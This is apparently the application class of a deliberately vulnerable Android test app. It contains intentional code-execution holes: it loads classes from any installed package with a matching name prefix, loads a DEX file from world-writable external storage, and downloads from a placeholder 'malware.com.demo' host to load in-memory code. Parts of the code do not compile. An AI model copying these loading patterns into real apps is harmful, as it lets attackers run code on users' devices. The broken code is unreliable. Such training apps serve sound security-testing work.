package oversecured.ovaa;

import android.app.Application;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import dalvik.system.DexClassLoader;
import java.io.File;

/* loaded from: classes.dex */
public class OversecuredApplication extends Application {
    @Override // android.app.Application
    public void onCreate() {
        super.onCreate();
        updateChecker();
        invokePlugins();
    }

    private void invokePlugins() {
        for (PackageInfo info : getPackageManager().getInstalledPackages(128)) {
            String packageName = info.packageName;
            Bundle meta = info.applicationInfo.metaData;
            if (packageName.startsWith("oversecured.plugin.") && meta.getInt("version", -1) >= 10) {
                try {
                    Context packageContext = createPackageContext(packageName, 3);
                    packageContext.getClassLoader().loadClass("oversecured.plugin.Loader").getMethod("loadMetadata", Context.class).invoke(null, this);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }

    private void updateChecker() {
        try {
            File file = new File("/sdcard/updater.apk");
            if (file.exists() && file.isFile() && file.length() <= 1000) {
                DexClassLoader cl = new DexClassLoader(file.getAbsolutePath(), getCacheDir().getAbsolutePath(), null, getClassLoader());
                int version = ((Integer) cl.loadClass("oversecured.ovaa.updater.VersionCheck").getDeclaredMethod("getLatestVersion", new Class[0]).invoke(null, new Object[0])).intValue();
                if (Build.VERSION.SDK_INT < version) {
                    Toast.makeText(this, "Update required!", 1).show();
                }
            }
        } catch (Exception e) {
        }
    }

    private void updateChecker2() {
        try {
            File file = new File(context.getExternalCacheDir(), "/update.apk");
            if (file.exists() && file.isFile() && file.length() <= 1000) {
                DexClassLoader cl = new DexClassLoader(file.getAbsolutePath(), getCacheDir().getAbsolutePath(), null, getClassLoader());
                int version = ((Integer) cl.loadClass("oversecured.ovaa.updater.VersionCheck").getDeclaredMethod("getLatestVersion", new Class[0]).invoke(null, new Object[0])).intValue();
                if (Build.VERSION.SDK_INT < version) {
                    Toast.makeText(this, "Update required!", 1).show();
                }
            }
        } catch (Exception e) {
        }
    }

    private void downloadFile(String url) {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL u = new URL(url);
                    URLConnection conn = u.openConnection();
                    int contentLength = conn.getContentLength();
                    DataInputStream stream = new DataInputStream(u.openStream());
                    byte[] buffer = new byte[contentLength];
                    stream.readFully(buffer);
                    stream.close();

                    Log.d("seccheck", "Success of download to buffer");
                } catch (Exception e) {
                    Log.e("seccheck", e.getMessage());
                }
            }
        });
        thread.start();
    }

    private void loadAndInvokeInMemoryDex(byte[] buffer) {
        downloadFile("https://malware.com.demo");
        byte[] buffer = new byte[100];
        ByteBuffer btBuffer = ByteBuffer.wrap(buffer);

        InMemoryDexClassLoader lder = new InMemoryDexClassLoader(btBuffer, getClassLoader());

        try {
            Class<?> mt = lder.loadClass("com.erev0s.randomnumber.RandomNumber");
            Method checkMethodInMemory = mt.getMethod("getRandomNumber");
            Object newcl = mt.newInstance();
            String result = checkMethodInMemory.invoke(newcl).toString();
            Log.d("seccheck", "Result of invoking method: " + result);
        } catch (Exception e) {
            Log.e("seccheck", e.getMessage());
    }
}

}